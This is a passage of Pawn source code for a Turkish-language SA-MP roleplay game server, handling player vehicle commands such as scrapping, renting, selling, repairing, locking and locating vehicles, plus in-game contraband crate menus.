		    if(!Girdi[playerid]) return 1;
		    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde olmanýz gerekmektedir.");
            if(!IsPlayerInRangeOfPoint(playerid, 15, Veriler[gposx], Veriler[gposy], Veriler[gposz]) && !IsSeaVehicle(GetPlayerVehicleID(playerid)) && !IsAirVehicle(GetPlayerVehicleID(playerid))) return Hata(playerid, "Galeride deðilsiniz.");
			string = strtok(cmdtext, idx);
		    if(isnull(string)) return Kullanim(playerid, "/a(rac) hurda [kabul]"),SendClientMessageEx(playerid, -1, ""C3"Alacaðýnýz ücret: %d", floatround(Arac[GetPlayerVehicleID(playerid)][afiyat]*40/100));
		    if(Buysa("kabul",string))
		    {
		        new veh=GetPlayerVehicleID(playerid);
		        if(Arac[veh][aowner] == Karakter[playerid][sqlid] && Arac[veh][atip] != 5)
		        {
		            if(Arac[veh][birlikdestek]) return Hata(playerid, "Bu aracý hurdaya çýkartamazsýnýz.");
		            if(Arac[veh][parcalandi]) return Hata(playerid, "Parçalanmýþ aracý hurdaya çýkartamazsýnýz.");
		            new _u = floatround(Arac[GetPlayerVehicleID(playerid)][afiyat]*40/100);
					Bilgi(playerid, "Aracý hurdalýða çýkardýnýz.");
					GivePlayerCash(playerid, _u);
					Arac[veh][aowner] = -1;
					Arac[veh][atip] = 1;
					Arac[veh][abirliktip] = 0;
					new Float:pPos[3];
					GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
					SetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]+2);
					SetVehiclePos(veh, 1682.4507,1622.2616,10.8203);
					SetVehicleVirtualWorld(veh, 1);
					Arac[veh][aposx] = 1682.4507;
					Arac[veh][aposy] = 1622.2616;
					Arac[veh][aposz] = 10.8203;
					Arac[veh][avworld] = 1;
					Arac[veh][ahurda] = 1;
					AracAnahtarTumSil(veh);
					AracKaydet(veh);
		        }
		        else return Hata(playerid, "Bu aracýn sahibi deðilsiniz.");
		    }
		    else return Kullanim(playerid, "/a(rac) hurda [kabul]"),SendClientMessageEx(playerid, -1, ""C3"Alacaðýnýz ücret: %d", floatround(Arac[GetPlayerVehicleID(playerid)][afiyat]*40/100));
		}
		else if(Buysa("kutular", string))
		{
		    if(!Girdi[playerid] || (Birlik[Karakter[playerid][birlik]][ftip] != MAFYA && Birlik[Karakter[playerid][birlik]][ftip] != CETE && Birlik[Karakter[playerid][birlik]][ftip] != MC)) return 1;
		    if(IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Kutu taþýmak için aracýn bagajýnda olmalýsýnýz.");
		    new vid = GetNearestVehicle(playerid);
		    if(!IsValidVehicle(vid)) return Hata(playerid, "Kutu taþýmak için aracýn bagajýnda olmalýsýnýz.");
		    if(!IsAMyBoat(vid) && Arac[vid][akilit]) return Hata(playerid, "Araç kilitli.");
		    if(!IsAMyBoat(vid) && !IsPlayerNearBoot(playerid, vid)) return Hata(playerid, "Kutu taþýmak için aracýn bagajýnda olmalýsýnýz.");
		    SetPVarInt(playerid, "AracID", vid);
			new mstring[512];
			if(IsAMyBoat(vid))
			{
			    format(mstring, sizeof(mstring), ""C2"%d Kutu "C1"Esrar\n",AUyusturucu[vid][esrar]);
			    format(mstring, sizeof(mstring), "%s"C2"%d Kutu "C1"Amfetamin Haplarý\n",mstring,AUyusturucu[vid][amfetamin]);
			    format(mstring, sizeof(mstring), "%s"C2"%d Kutu "C1"Metamfetamin Haplarý\n",mstring,AUyusturucu[vid][metamfetamin]);
			    format(mstring, sizeof(mstring), "%s"C2"%d Kutu "C1"LSD Haplarý\n",mstring,AUyusturucu[vid][lsd]);
			    format(mstring, sizeof(mstring), "%s"C2"%d Kutu "C1"Extacy Haplarý\n",mstring,AUyusturucu[vid][extacy]);
			    format(mstring, sizeof(mstring), "%s"C2"%d Kutu "C1"Kokain\n",mstring,AUyusturucu[vid][kokain]);
			    format(mstring, sizeof(mstring), "%s"C2"%d Kutu "C1"Eroin\n",mstring,AUyusturucu[vid][eroin]);
			    format(mstring, sizeof(mstring), "%s"C2"%d Kutu "C1"Morfin Ýlacý\n",mstring,AUyusturucu[vid][morfin]);
			    format(mstring, sizeof(mstring), "%s"C2"%d Kutu "C1"MDA Haplarý\n",mstring,AUyusturucu[vid][MDA]);
			    ShowPlayerDialog(playerid, 257, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Kutu", mstring, "Taþý", "Ýptal");
			    return 1;
			}
			if(!IsAMyBoat(vid)) format(mstring, sizeof(mstring), "A Materyal Kutusu\t ( "C2"%d "C1")\nB Materyal Kutusu\t ( "C2"%d "C1")\nC Materyal Kutusu\t ( "C2"%d "C1")\nD Materyal Kutusu\t ( "C2"%d "C1")\nE Materyal Kutusu\t ( "C2"%d "C1")",Materyal[vid][A],Materyal[vid][B],Materyal[vid][C],Materyal[vid][D],Materyal[vid][E]);
			ShowPlayerDialog(playerid, 257, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Araç Kutu", mstring, "Taþý", "Ýptal");
		}
		else if(Buysa("at", string))
		{
		    if(Girdi[playerid])
		    {
		        new pid;
                string = strtok(cmdtext, idx);
			    if(sscanf(string, "d", pid)) return Kullanim(playerid, "/a(rac) at [oyuncuID]");
			    if(!Girdi[pid]) return Hata(playerid, "Hatalý oyuncuID belirttiniz.");
			    if(IsPlayerInAnyVehicle(playerid))
			    {
			        new vid = GetPlayerVehicleID(playerid);
			        if(Arac[vid][aowner] == Karakter[playerid][sqlid] || AracAnahtarKontrol(playerid, vid))
			        {
			            if(!IsPlayerInVehicle(pid, vid)) return Hata(playerid, "Oyuncu aracýnýzda deðil.");
			            RemoveFromVehicle(pid);
			            Bilgi(playerid, "Oyuncuyu araçtan attýnýz.");
			        }
			        else Hata(playerid, "Bu araçtan oyuncu atamazsýnýz.");
			    }
			    else
				{
					new vid = GetNearestVehicle(playerid);
					if(Arac[vid][akilit]) return Hata(playerid, "Araç kilitli.");
					if(!IsPlayerNearPlayer(playerid, pid, 5)) return Hata(playerid, "Oyuncunun yanýnda deðilsiniz.");
					Bilgi(playerid, "Oyuncuya onay isteði yolladýnýz.");
					new mstring[128];
					format(mstring, sizeof(mstring), "%s sizi araca atmak istiyor, cevabýnýz nedir:",OyuncuAdiniBul(playerid));
					ShowPlayerDialog(pid, 250, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Araç At", mstring, "Kabul Et", "Reddet");
					SetPVarInt(pid, "AracAtan", playerid);
					SetPVarInt(pid, "AracID", vid);
				}
		    }
  		}
		else if(Buysa("cezaode", string))
		{
		    if(IsPlayerConnected(playerid))
			{
			    if(IsPlayerInRangeOfPoint(playerid, 30.0, -1265.0060,2427.4622,3501.4866))
				{
					new vid;
	                string = strtok(cmdtext, idx);
				    if(sscanf(string, "d", vid)) return Kullanim(playerid, "/a(rac) cezaode [vehicleID]");
					if(cezali[vid] == 0) return Hata(playerid, "Bu aracýn cezasý bulunmamaktadýr.");
					if(GetPlayerCash(playerid) < cezali[vid]) return Hata(playerid, "Cezayý ödemek için yeterli paranýz bulunmamaktadýr.");
					if(!IsValidVehicle(vid)) return Hata(playerid, "Hatalý araç id.");
					GivePlayerCash(playerid, -cezali[vid]);
					Bilgi(playerid, "Aracýn cezasýný ödediniz.");
					/*SendClientMessage(playerid, -1,"{B3B3B3}((Aracýnýz LSPD garajýnýn arkasýnda spawn olmuþtur.))");
					SetVehicleVirtualWorld(vid, 0);
					SetVehiclePos(vid, 1614.7338,-1623.4336,13.2676);
					SetVehicleZAngle(vid, 181.2168);*/
					MotoruKapat(vid);
					cezali[vid] = 0;
					AracKaydet(vid);
				}
				else
				{
				    Hata(playerid, "Cezanýzý ödeyebilmek için LSPD lobisinde olmalýsýnýz.");
				}
			}
		}
		else if(strcmp(string, "radyo", true) == 0)
		{
		    if(IsPlayerInAnyVehicle(playerid))
		    {
		        if(GetPlayerVehicleSeat(playerid) != 1 && GetPlayerVehicleSeat(playerid) != 0) return Hata(playerid, "Ön koltukta oturmuyorsunuz.");
		        ShowPlayerDialog(playerid, 225, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Araç Radyo","Jazz\nClassic Rock\nMetal\nDubstep\nCountry\nRap\nURL Ýle Çalma\nYoutube Ýle Çalma\nRadio'yu Kapat","Seç", "Kapat");
		    }
		    else Hata(playerid, "Aracýn içerisinde deðilsiniz.");
		}
		else if(strcmp(string, "satinal", true) == 0)
		{
		    if(Veriler[gdurum] == 1)
		    {
		        Hata(playerid, "Galeri bir süreliðine pasif durumdadýr, araç satýþý yasaklanmýþtýr.");
				return 1;
			}
			else
			{
			    if(Karakter[playerid][ehliyet] != 1) return Hata(playerid, "Galeriden araç satýn almak için ehliyetinizin bulunmasý gerekiyor.");
			    if(IsPlayerInRangeOfPoint(playerid, 3.0, Veriler[gposx], Veriler[gposy], Veriler[gposz]))
			    {
				    ShowModelSelectionMenu2(playerid, aliste, "Galeri");
					return 1;
				}
				else
				{
				    Hata(playerid, "Araç satýn alabilmek için galeride olmalýsýnýz.");
				    return 1;
				}
			}
		}
		else if(!strcmp(string, "cam", true))
		{
			new veh = GetPlayerVehicleID(playerid);
			if(IsValidVehicle(veh))
			{
			    new driver, passenger, backleft, backright;
			    if(!IsWindowedVehicle(veh)) return Hata(playerid, "Bu araçta cam açamazsýnýz.");
			    switch(GetPlayerVehicleSeat(playerid))
			    {
			        case 0:
			        {
			        	GetVehicleParamsCarWindows(veh, driver, passenger, backleft, backright);
			        	if(driver == 0)
			        	{
			        	    SetVehicleParamsCarWindows(veh, 1, passenger, backleft, backright);
			        	    MeGonder(playerid, 15.0, "aracýn camýný kapatýr.");
			        	}
			        	else
			        	{
			        	    SetVehicleParamsCarWindows(veh, 0, passenger, backleft, backright);
			        	    MeGonder(playerid, 15.0, "aracýn camýný açar.");
						}
			        }
			        case 1:
			        {
			        	GetVehicleParamsCarWindows(veh, driver, passenger, backleft, backright);
			        	if(passenger == 0)
			        	{
			        	    SetVehicleParamsCarWindows(veh, driver, 1, backleft, backright);
			        	    MeGonder(playerid, 15.0, "aracýn camýný kapatýr.");
			        	}
			        	else
			        	{
			        	    SetVehicleParamsCarWindows(veh, driver, 0, backleft, backright);
			        	    MeGonder(playerid, 15.0, "aracýn camýný açar.");
						}
			        }
			        case 2:
			        {
			        	GetVehicleParamsCarWindows(veh, driver, passenger, backleft, backright);
			        	if(backleft == 0)
			        	{
			        	    SetVehicleParamsCarWindows(veh, driver, passenger, 1, backright);
			        	    MeGonder(playerid, 15.0, "aracýn camýný kapatýr.");
			        	}
			        	else
			        	{
			        	    SetVehicleParamsCarWindows(veh, driver, passenger, 0, backright);
			        	    MeGonder(playerid, 15.0, "aracýn camýný açar.");
						}
			        }
			        case 3:
			        {
			        	GetVehicleParamsCarWindows(veh, driver, passenger, backleft, backright);
			        	if(backright == 0)
			        	{
			        	    SetVehicleParamsCarWindows(veh, driver, passenger, backleft, 1);
			        	    MeGonder(playerid, 15.0, "aracýn camýný kapatýr.");
			        	}
			        	else
			        	{
			        	    SetVehicleParamsCarWindows(veh, driver, passenger, backleft, 0);
			        	    MeGonder(playerid, 15.0, "aracýn camýný açar.");
						}
			        }
			        default: Hata(playerid, "Bu koltukta aracýn camýný açamazsýnýz.");
			    }
			}
		}
		else if(!strcmp(string, "kirala", true))
		{
			new veh = GetPlayerVehicleID(playerid);
			if(IsValidVehicle(veh) && Arac[veh][atip] == 5 && Arac[veh][aowner] == -1)
			{
			    if(!Karakter[playerid][ehliyet]) return Hata(playerid, "Ehliyetiniz olmadan araç kiralayamazsýnýz.");
			    string = strtok(cmdtext, idx);
			    if(isnull(string)) return Kullanim(playerid, "/a kirala [saat(1-2)]");
			    if(1 <= strval(string) <= 2)
				{
				    if(Karakter[playerid][para] >= Arac[veh][afiyat]*strval(string))
				    {
				        GivePlayerCash(playerid, -(Arac[veh][afiyat]*strval(string)));
				        Arac[veh][aowner] = Karakter[playerid][sqlid];
						Arac[veh][asure] = strval(string)*60;
				    }
				    else Hata(playerid, "Yanýnýzda yeterli miktar nakit bulunmamaktadýr.");
				}
				else Hata(playerid, "Geçersiz miktar girdiniz.");
			}
		    return 1;
		}
		else if(!strcmp(string, "sure", true))
		{
			new veh = GetPlayerVehicleID(playerid);
			if(Arac[veh][aowner] == Karakter[playerid][sqlid])
			{
                format(string, sizeof(string), "Araç kira kalan süreniz: %d dakika", Arac[GetPlayerVehicleID(playerid)][asure]);
	            Bilgi(playerid, string);
			}
		    return 1;
		}
		else if(Buysa("liste", string))
		{
		    if(AracListeAracD[playerid] != 0) return 1;
		    new aracsay = AracSay_Ex(playerid);
		    if(aracsay == 0) return Hata(playerid, "Aracýnýz yok.");
		    format(string, sizeof(string), ""C7"| Araçlarým  "C8"(%d Adet)"C7" |", aracsay);
		    SendClientMessage(playerid, TENRENGI, string);
		    new sayi;
		    for(new am;am<MAX_VEHICLES;am++)
		    {
				if(Arac[am][aowner] == Karakter[playerid][sqlid])
				{
					if(IsValidVehicle(am))
					{
						if(Arac[am][vergi] > floatround(Arac[am][afiyat]/20)) format(string, sizeof(string), ""C7"Araç id: "C1"%d "C7"Model: "C1"%s "C7"Km: "C1"%d "C7"Vergi: "C4"%d$", am, GetVehicleName(am), Arac[am][akm], Arac[am][vergi]);
						else if(Arac[am][vergi] > 0) format(string, sizeof(string), ""C7"Araç id: "C1"%d "C7"Model: "C1"%s "C7"Km: "C1"%d "C7"Vergi: "DOLAR"%d$", am, GetVehicleName(am), Arac[am][akm], Arac[am][vergi]);
						else format(string, sizeof(string), ""C7"Araç id: "C1"%d "C7"Model: "C1"%s "C7"Km: "C1"%d "C7"Vergi: "C1"%d$", am, GetVehicleName(am), Arac[am][akm], Arac[am][vergi]);
						SendClientMessage(playerid, COLOR_WHITE ,string);
						sayi++;
						if(aracsay == sayi) break;
					}
				}
			}
			return 1;
		}
		else if(strcmp(string, "bilgi", true) == 0)
		{
		    new aracsay;
		    if(AracListeAracD[playerid] != 0) return 1;
		    aracsay = AracSayEx(playerid);
		    if(aracsay == 0) return Hata(playerid, "Aracýnýz yok.");
		    SetPVarInt(playerid, "AracListeKomut", 1);
		    format(string, sizeof(string), ""C7"| Araçlarým  "C8"(%d Adet)"C7" |", AracSayEx(playerid));
		    SendClientMessage(playerid, -1, string);
			new sayi;
		    for(new am;am<MAX_VEHICLES;am++)
		    {
				if(Arac[am][aowner] == Karakter[playerid][sqlid] || AracAnahtarKontrol(playerid, am) || (Arac[am][abirlik] == Karakter[playerid][birlik] && Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != ASMS && Birlik[Karakter[playerid][birlik]][ftip] != SANTV && Birlik[Karakter[playerid][birlik]][ftip] != LSFD))
				{
					if(IsValidVehicle(am))
					{
						new ctext[6];
						ctext = "Hayýr";
						if(cezali[am] > 0) ctext = "Evet";
					    format(string, sizeof(string), "|Anahtar| [%d], %s, Kilit Seviyesi[%d], Alarm[%d], Immobilizer[%d], KM[%d], Vergi[%d$], Baðlý[%s] Ceza Ücreti[%d$]", am, VehicleName[GetVehicleModel(am)-400][0], Arac[am][akilittip], Arac[am][aalarm], Arac[am][aimmo], Arac[am][akm], Arac[am][vergi], ctext, cezali[am]);
					    if(Arac[am][atip] == 5) format(string, sizeof(string), "|Kira| [%d], %s, Kilit Seviyesi[%d], Alarm[%d], Immobilizer[%d], KM[%d], Vergi[%d$], Baðlý[%s] Ceza Ücreti[%d$]", am, VehicleName[GetVehicleModel(am)-400][0], Arac[am][akilittip], Arac[am][aalarm], Arac[am][aimmo], Arac[am][akm], Arac[am][vergi], ctext, cezali[am]);
					    if(Arac[am][atip] == 1 && Arac[am][aowner] == Karakter[playerid][sqlid]) format(string, sizeof(string), "|Sahip| [%d], %s, Kilit Seviyesi[%d], Alarm[%d], Immobilizer[%d], KM[%d], Vergi[%d$], Baðlý[%s] Ceza Ücreti[%d$]", am, VehicleName[GetVehicleModel(am)-400][0], Arac[am][akilittip], Arac[am][aalarm], Arac[am][aimmo], Arac[am][akm], Arac[am][vergi], ctext, cezali[am]);
                        if(Arac[am][atip] == 2 && Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != SANTV && Birlik[Karakter[playerid][birlik]][ftip] != ASMS && Birlik[Karakter[playerid][birlik]][ftip] != LSFD)
							format(string, sizeof(string), "|Birlik| [%d], %s, Kilit Seviyesi[%d], Alarm[%d], Immobilizer[%d], KM[%d], Vergi[%d$], Baðlý[%s] Ceza Ücreti[%d$]", am, VehicleName[GetVehicleModel(am)-400][0], Arac[am][akilittip], Arac[am][aalarm], Arac[am][aimmo], Arac[am][akm], Arac[am][vergi], ctext, cezali[am]);
						SendClientMessage(playerid, COLOR_WHITE ,string);
						sayi++;
					    /*if(sayi == 1)
					    {
						    PlayerTextDrawSetPreviewModel(playerid, AracListeTD[playerid], GetVehicleModel(am));
						    PlayerTextDrawSetPreviewVehCol(playerid, AracListeTD[playerid], Arac[am][arenk1], Arac[am][arenk2]);
						    new cizgiver[128];
						    format(cizgiver, sizeof(cizgiver), "_________");
						    strdel(cizgiver, 9-(strlen(VehicleName[GetVehicleModel(am)-400][0])/2), strlen(cizgiver));
						    format(string, sizeof(string), "%s%s", cizgiver, VehicleName[GetVehicleModel(am)-400][0]);
	                        PlayerTextDrawSetString(playerid, AracListeTDYazi[playerid], string);
				   			AracListeAracD[playerid] = am;
				   			PlayerTextDrawShow(playerid, AracListeTD[playerid]);
				   			PlayerTextDrawShow(playerid, AracListeTDYazi[playerid]);
				   			SetPVarInt(playerid, "AracListeSira", 1);
				   			SelectTextDraw(playerid, 0xFFFFFFAA);
						}
						if(sayi == 2)
						{
		    				PlayerTextDrawSetPreviewModel(playerid, AracListeTDSag[playerid], GetVehicleModel(am));
						    PlayerTextDrawSetPreviewVehCol(playerid, AracListeTDSag[playerid], Arac[am][arenk1], Arac[am][arenk2]);
						    SetPVarInt(playerid, "AracListeAracDSonraki", am);
							PlayerTextDrawShow(playerid, AracListeTDSag[playerid]);
						}*/
						if(aracsay == sayi) break;
					}
				}
			}
			return 1;
		}
		else if(strcmp(string, "tamir", true) == 0)
		{
		    if(TamirPos(playerid))
		    {
			    if(Girdi[playerid])
			    {
					if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
					{
					    if(Arac[GetPlayerVehicleID(playerid)][parcalandi] == 1)
						{
							if(GetPlayerCash(playerid) < floatround(Arac[GetPlayerVehicleID(playerid)][afiyat]/12)) return Hata(playerid, "Araç tamir etmek için yeterli miktarda paranýz bulunmuyor.");
						    new Float:vHealth;
						    GetVehicleHealth(GetPlayerVehicleID(playerid), vHealth);
						    SetTimerEx("Aractamiri", 3500, false, "i", GetPlayerVehicleID(playerid));
			                SetPVarInt(playerid, "VehicleRepair", 1);
			                Arac[GetPlayerVehicleID(playerid)][parcalandi] = 0;
			                SetTimerEx("UnfreezeTimer", 3500, false, "u", playerid);
							SendClientMessage(playerid, TENRENGI, "» Aracýnýz tamir ediliyor, birkaç saniye bekleyin.");
							DONDUR(playerid);
							GivePlayerCash(playerid, -floatround(Arac[GetPlayerVehicleID(playerid)][afiyat]/12));
						}
						else
						{
						    if(GetPlayerCash(playerid) < 50) return Hata(playerid, "Araç tamir etmek için yeterli miktarda paranýz bulunmuyor.");
						    new npara,Float:vHealth,mstring[128];
						    GetVehicleHealth(GetPlayerVehicleID(playerid), vHealth);
							if(900 <= vHealth <= 1000) npara = 50;
							if(400 <= vHealth < 900) npara = floatround((1000-vHealth)/2);
							if(vHealth < 400) npara = 300;
							if(GetPlayerCash(playerid) < npara && Birlik[Karakter[playerid][birlik]][ftip] != LSPD && Birlik[Karakter[playerid][birlik]][ftip] != ASMS && Birlik[Karakter[playerid][birlik]][ftip] != LSFD) { format(mstring, sizeof(mstring), "Yeterli paranýz yok. [%d$]",npara); Hata(playerid, mstring); return 1; }
			                SetTimerEx("Aractamiri", 3500, false, "i", GetPlayerVehicleID(playerid));
			                SetPVarInt(playerid, "VehicleRepair", 1);
			                SetTimerEx("UnfreezeTimer", 3500, false, "u", playerid);
							SendClientMessage(playerid, TENRENGI, "» Aracýnýz tamir ediliyor, birkaç saniye bekleyin.");
							DONDUR(playerid);
							GivePlayerCash(playerid, -npara);
						}
					}
					else
					{
					    Hata(playerid, "Araç içerisinde deðilsiniz.");
					}
				}
			}
			else
			{
			    Hata(playerid, "Bu komutu kullanabilmek için gereken yerde deðilsiniz.");
			}
		}
		else if(strcmp(string, "yedekanahtar", true) == 0)
		{
		    string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    Kullanim(playerid,"/a(rac) yedekanahtar [ID/isim]");
			    Ipucu(playerid, "Aracýnýzýn yedek anahtarýný bir baþkasýyla paylaþmanýzý saðlar.");
			    Ipucu(playerid, "Eðer aracýn yedek anahtarýný sýfýrlamak istiyorsanýz -1 deðerini girin.");
			    return 1;
			}
			new adaminadi = strval(string);
			new vid = GetPlayerVehicleID(playerid);
			if(adaminadi == -1)
			{
			    if(IsPlayerInVehicle(playerid, vid))
			    {
			        if(Arac[vid][aowner] == Karakter[playerid][sqlid] && Arac[vid][atip] != 5)
			        {
						Bilgi(playerid, "Aracýnýzýn yedek anahtarýný sýfýrladýnýz.");
						AracAnahtarTumSil(vid);
						return 1;
					}
				}
				else return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
			}
			adaminadi = ReturnUser(string);
			if(ProxDetectorS(4.5, playerid, adaminadi) && adaminadi != playerid)
			{
			    if(IsPlayerInVehicle(playerid, vid))
			    {
			        if(Arac[vid][aowner] == Karakter[playerid][sqlid] && Arac[vid][atip] != 5)
			        {
			            if(AracAnahtarKontrol(adaminadi,vid)) return Hata(playerid, "Oyuncuda zaten bu aracýn anahtarý var.");
			            SetPVarInt(adaminadi, "TeklifArac", vid);
			            SetPVarInt(adaminadi, "TeklifAracVeren", playerid);
			            format(string, sizeof(string), ""C1"%s isimli kiþi size aracýnýn yedek anahtarýný vermek istiyor.", OyuncuAdiniBul(playerid));
			            ShowPlayerDialog(adaminadi, 2, DIALOG_STYLE_MSGBOX, ""SDIALOG"", string, "Onayla", "Ýptal");
						Bilgi(playerid, "Oyuncuya anahtar verme isteði yolladýnýz.");
					}
				}
				else return Hata(playerid, "Aracýn içerisinde deðilsiniz.");
			}
			return 1;
		}
		else if(strcmp(string, "sat", true) == 0)
		{
		    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		    {
		        new deluhanli;
				string = strtok(cmdtext, idx);
				if(!strlen(string))
				{
				    Kullanim(playerid,"/a(rac) sat [ID/isim] [fiyat]");
				    return 1;
			    }
			    new adaminadi = ReturnUser(string);
			    string = strtok(cmdtext, idx);
			    deluhanli = strval(string);
				if(deluhanli <= 0 || deluhanli > 500000)
				{
				    Hata(playerid, "Hatalý miktar girdiniz.");
				    Kullanim(playerid,"/a(rac) sat [ID/isim] [fiyat]");
				    return 1;
			    }
				if(IsPlayerConnected(adaminadi))
			    {
					new vid = GetPlayerVehicleID(playerid);
					if(Arac[vid][aowner] == Karakter[playerid][sqlid] && Arac[vid][atip] != 5)
					{
					    if(Arac[vid][birlikdestek]) return Hata(playerid, "Bu araç satýlamaz.");
					    if(ProxDetectorS(5.0, playerid, adaminadi) && playerid != adaminadi)
					    {
					        if(Arac[vid][vergi] != 0) return Hata(playerid, "Aracýn üzerinde vergi bulunmaktadýr.");
					        SetPVarInt(adaminadi, "AracTeklifVeren", playerid);
					        SetPVarInt(adaminadi, "AracTeklifArac", vid);
					        SetPVarInt(adaminadi, "AracTeklifFiyat", deluhanli);
					        format(string, sizeof(string), "%s size aracýný %d$ karþýlýðýnda satmak istiyor.", OyuncuAdiniBul(playerid), deluhanli);
					        ShowPlayerDialog(adaminadi, 3, DIALOG_STYLE_MSGBOX, ""SDIALOG"", string, "Kabul Et", "Reddet");
					        SetPVarInt(playerid, "AracTeklifEdiyor", 1);
					    }
					    else return Hata(playerid, "Oyuncuya yakýn deðilsiniz.");
					}
					else Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
				}
				else
				{
				    Hata(playerid, "Aracý satmak istediðiniz kiþi oyunda deðil.");
				    return 1;
				}
			}
			else
			{
			    Hata(playerid, "Sahip olduðunuz ve satmak istediðiniz aracýnýzýn þöför koltuðunda olmalýsýnýz.");
			    return 1;
			}
			return 1;
		}
		else if(strcmp(string, "gps", true) == 0)
		{
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    Kullanim(playerid,"/a(rac) gps [vehID]");
			    Bilgi(playerid, "Aracýnýzýn konumunu bulmanýzý saðlar.");
			    return 1;
			}
			new bululan = strval(string);
			if(bululan < 0 || bululan > MAX_VEHICLES) return Hata(playerid, "Hatalý araç id belirttiniz.");
			if(!SevkiyatGorev[playerid] && !LojGorevde[playerid] && !PizzaGorevde[playerid] && !KamGorevde[playerid] && !EleGorevde[playerid] && !SicilTGorevde[playerid] && !otobuste[playerid] && !GetPVarInt(playerid, "TGorev") && !GetPVarInt(playerid, "TIsbasi"))
   			{
				if(Arac[bululan][aowner] == Karakter[playerid][sqlid] || AracAnahtarKontrol(playerid, bululan) || Arac[bululan][abirlik] == Karakter[playerid][birlik])
				{
				    //if(Arac[bululan][aspawn] == 0){ Hata(playerid, "Aracýnýzýn konumunu öðrenebilmek için spawn etmelisiniz. (/a getir)"); return 1; }
					if(cezali[bululan] > 0) return Hata(playerid, "Cezalý araçlarýnýzýn yerini bulamazsýnýz.");
					if(IsPlayerInVehicle(playerid, bululan))
				    {
				        return 1;
					}
					SetPVarInt(playerid, "GPSActi", 1);
					new Float:vPos[3];
					GetVehiclePos(bululan, vPos[0],vPos[1],vPos[2]);
					SetPlayerCheckpoint(playerid,vPos[0],vPos[1],vPos[2],5.0);
					Bilgi(playerid, "Aracýnýz haritada iþaretlendi.");
				}
				else
				{
				    Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
					return 1;
				}
    		}
			else
			{
			    Hata(playerid, "Meslek yaparken bu komutu kullanamazsýnýz.");
			}
			return 1;
		}
		/*else if(strcmp(string, "getir", true) == 0)
		{
			string = strtok(cmdtext, idx);
			if(!strlen(string))
			{
			    Kullanim(playerid,"/a(rac) getir [vehID]");
			    Ipucu(playerid, "Park halindeki aracýnýzý getirmenizi saðlar.");
			    return 1;
			}
			new delikanli = strval(string);
			if(Arac[delikanli][atip] != 5 && Arac[delikanli][aowner] == Karakter[playerid][sqlid] || AracAnahtarKontrol(playerid, delikanli))
			{
				if(Arac[delikanli][aspawn] == 0)
				{
				    SetVehicleVirtualWorld(delikanli, 0);
				    LinkVehicleToInterior(delikanli, 0);
				    SetVehicleZAngle(delikanli, Arac[delikanli][aposa]);
				    Arac[delikanli][aspawn] = 1;
				    SetVehiclePosEx(delikanli,Arac[delikanli][aposx], Arac[delikanli][aposy], Arac[delikanli][aposz]);
				    AracKaydet(delikanli);
					format(string, sizeof(string), "~w~ARACINIZ ~g~GETIRILDI");
					GameTextForPlayer(playerid, string, 2500, 4);
				}
			}
			else Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
			return 1;
		}*/
		else if(strcmp(string, "kilit", true) == 0)
		{
	     	new vid = GetNearestVehicle(playerid);
			if(!AracSayiKontrol(playerid)) return Hata(playerid, "Yakýnýnýzda birden fazla araç bulunmaktadýr, lütfen ''/a(rac) kilitid'' komutunu kullanýn.");
	      	if(vid != INVALID_VEHICLE_ID)
	       	{
	       	    if(!IsDoorVehicle(vid)) return Hata(playerid, "Bu aracý kilitleyemezsiniz.");
	       	    if(Arac[vid][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][meslek] == 2 && Taksi[playerid] == vid) || (Karakter[playerid][birlik] == Arac[vid][abirlik]) || AracAnahtarKontrol(playerid, vid) || IsyeriYetkilisi(playerid, Arac[vid][aisyeri]))
	       	    {
					if(Arac[vid][akilit])
					{
						format(string, sizeof(string), "~g~KILIT ACILDI");
		    			GameTextForPlayer(playerid, string, 2000, 4);
						KilitAc(vid);
						format(string,sizeof(string),"* aracýn kilidini açar.");
						SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
						format(string,sizeof(string),"(( %s aracýn kilidini açar. ))",OyuncuAdiniBul(playerid));
						SendClientMessage(playerid,0xC2A2DAFF,string);
					}
					else
					{
						format(string, sizeof(string), "~r~KILITLENDI");
						GameTextForPlayer(playerid, string, 2000, 4);
		    			KilitKapat(vid);
		    			format(string,sizeof(string),"* aracý kilitler.");
						SetPlayerChatBubble(playerid,string,COLOR_CPURPLE2,8.0,10000);
						format(string,sizeof(string),"(( %s aracý kilitler. ))",OyuncuAdiniBul(playerid));
						SendClientMessage(playerid,0xC2A2DAFF,string);
					}
				}
				else Hata(playerid, "Bu aracýn anahtarýna sahip deðilsiniz.");
	        }
	        else Hata(playerid, "Yakýnýnýzda araç bulunmamaktadýr.");
		    return 1;
		}
		else if(strcmp(string, "kilitid", true) == 0)
		{
		    new vid;
	     	string = strtok(cmdtext, idx);
	     	if(sscanf(string,"d",vid)) return Kullanim(playerid, "/a(rac) kilitid [aracID]");
	      	if(IsValidVehicle(vid))
	       	{
	       	    new Float:vPos[3];
				GetVehiclePos(vid, vPos[0], vPos[1], vPos[2]);
				if(!IsPlayerInRangeOfPoint(playerid, 3.5, vPos[0], vPos[1], vPos[2])) return Hata(playerid, "Aracýn yakýnýnda deðilsiniz.");
	       	    if(!IsDoorVehicle(vid)) return Hata(playerid, "Bu aracý kilitleyemezsiniz.");
